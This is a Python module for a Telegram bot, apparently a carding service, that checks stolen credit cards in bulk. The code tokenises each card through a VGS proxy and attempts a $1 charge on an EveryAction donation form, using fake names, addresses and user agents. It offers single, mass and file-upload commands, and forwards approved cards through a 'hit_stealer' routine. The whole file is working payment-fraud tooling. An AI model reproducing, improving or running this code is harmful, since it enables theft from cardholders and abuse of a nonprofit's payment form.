import time
import asyncio
import re
import os
import uuid
import random
import httpx
from faker import Faker
from pyrogram import Client, filters, enums

# --- IMPORTS FROM YOUR BOT ENVIRONMENT ---
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

fake = Faker()
MAX_MSC_LIMIT = 10 
MAX_TSC_LIMIT = 100

def get_fake_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.0.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0"
    ]
    return random.choice(user_agents)

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

async def call_cc_charge_api(fullcc):
    parts = re.split(r'[|:,\s]+', fullcc.strip())
    cc = parts[0] if len(parts) > 0 else ""
    mes = parts[1] if len(parts) > 1 else "08"
    ano = parts[2][-2:] if len(parts) > 2 else "29"
    cvv = parts[3] if len(parts) > 3 else "000"
    
    ua = get_fake_user_agent()
    vgs_sid = str(uuid.uuid4())
    gateway_name = "CC Charge"
    
    async with httpx.AsyncClient(timeout=30, follow_redirects=True) as session:
        # Step 1: Get VGS Token
        vgs_headers = {
            'content-type': 'application/json',
            'user-agent': ua,
            'vgs-client': f'source=vgs-collect&vgsCollectSessionId={vgs_sid}',
        }
        vgs_payload = {'Account': cc, 'ExpirationDate': {'ExpirationMonth': mes, 'ExpirationYear': ano}}
        
        token = None
        try:
            vgs_res = await session.post('https://tntw1pznlam.live.verygoodproxy.com/post', headers=vgs_headers, json=vgs_payload)
            token = vgs_res.json().get('Account')
        except:
            return "Error", "VGS Token Failed", gateway_name

        if not token:
            return "Error", "VGS Error", gateway_name

        # Step 2: Submit to EveryAction
        fn, ln = fake.first_name(), fake.last_name()
        email = f"{fn.lower()}.{ln.lower()}{random.randint(10,99)}@{fake.free_email_domain()}"
        ea_headers = {'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua}
        ea_data = {
            'Amount': '1.00', 'FirstName': fn, 'LastName': ln, 'AddressLine1': fake.street_address(),
            'Country': 'US', 'PostalCode': fake.postcode(), 'City': fake.city(), 'StateProvince': fake.state_abbr(),
            'EmailAddress': email, 'PaymentMethod': 'creditcard', 'Account': token,
            'ExpirationMonth': mes, 'ExpirationYear': ano,
            'FormSessionId': str(uuid.uuid4()), 'ClientSubmissionId': str(uuid.uuid4()), 'type': 'ContributionForm'
        }
        
        try:
            ea_res = await session.post('https://secure.everyaction.com/v2/Forms/CzxnMQjHNE2jDz5i7H8Nrg2', headers=ea_headers, data=ea_data)
            res_json = ea_res.json()
            status = res_json.get('resultCode', 'Unknown')
            
            if status == 'Success':
                return "Approved ✓", "CHARGED 1$ - APPROVED", gateway_name
            else:
                err = res_json.get('errors', [{}])[0].get('text', 'Declined')
                return "Declined ✗", err, gateway_name
        except:
            return "Error", "Submission Failed", gateway_name

# --- SINGLE CHECK COMMAND ---
@Client.on_message(filters.command("cn", [".", "/"]))
async def cc_charge_single_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        role = checkall[1]
        
        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> CC Charge
◈ <b>ᴄᴍᴅ :</b> /cn

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /cn cc|mes|ano|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return
            
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = "CC Charge"
        
        firstresp = f"✧ ᴄʜᴇᴄᴋɪɴɢ. ✧\n\n💠 𝘾𝙘-» <code>{fullcc}</code>\n💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>\n💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■□□□"
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)

        secondresp = f"✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧\n\n💠 𝘾𝙘-» <code>{fullcc}</code>\n💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>\n💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■□"
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)

        start = time.perf_counter()
        status, response, gateway = await call_cc_charge_api(fullcc)
        
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
💠 𝘽𝙞𝙣-» {brand}
_{type_}-{level}
💠 𝘽𝙖𝙣𝙠-» {bank}</blockquote>
════『 META 』════
💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
💠 𝙏𝙞𝙢𝙚-» {time.perf_counter() - start:0.2f}s
💠 𝘾𝙝𝙚𝙘𝙠𝙚checked 𝙗𝙮-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        
        await Client.edit_message_text(message.chat.id, secondchk.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "Approved" in status:
            await send_hit_if_approved(Client, finalresp)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- MASS CHECK COMMAND ---
@Client.on_message(filters.command("mcn", [".", "/"]))
async def cc_charge_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            ccs = extract_cards(message.text)

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> CC Charge
◈ <b>ᴄᴍᴅ :</b> /mcn

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply or /mcn cc|mm|yy|cvc (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- TXT FILE COMMAND ---
@Client.on_message(filters.command("tcn", [".", "/"]))
async def cc_charge_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> CC Charge
◈ <b>ᴄᴍᴅ :</b> /tcn

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- SEQUENTIAL PROCESSING LOGIC ---
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

💠 𝙂𝙖𝙩𝙚 -» CC Charge
💠 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
💠 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
━━━━━━━━━━━━━━━━━━━━"""
    progress_msg = await message.reply(initial_resp, quote=True, parse_mode=enums.ParseMode.HTML)
    header_text = f"✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧\n━━━━━━━━━━━━━━━━━━━━\n"
    final_text = header_text
    start_time = time.perf_counter()
    
    for fullcc in ccs:
        status, response, gateway = await call_cc_charge_api(fullcc)
        cc_num = fullcc.split("|")[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
        
        card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
💠 𝘽𝙞𝙣-» {brand}
_{type_}-{level}
💠 𝘽𝙖𝙣𝙠-» {bank}</blockquote>
━━━━━━━━━━━━━━━━━━━━\n"""
        final_text += card_resp
        try:
            await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        except: pass
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)
    footer = f"""════『 META 』════
💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
💠 𝙏𝙞𝙢𝙚-» {elapsed_time}s
💠 𝘾𝙝𝙚𝙘𝙠𝙚checked 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
    
    final_text += footer
    await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
    await setantispamtime(user_id)
